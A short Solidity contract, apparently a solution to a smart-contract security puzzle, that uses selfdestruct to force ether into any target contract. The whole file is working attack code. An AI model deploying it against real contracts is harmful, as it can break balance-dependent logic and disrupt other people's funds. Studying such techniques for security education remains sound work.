// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack{

    constructor() payable{} // this function is payable in order to send funds at deployment

    function attack(address target)external{
        selfdestruct(payable(target));
    }
}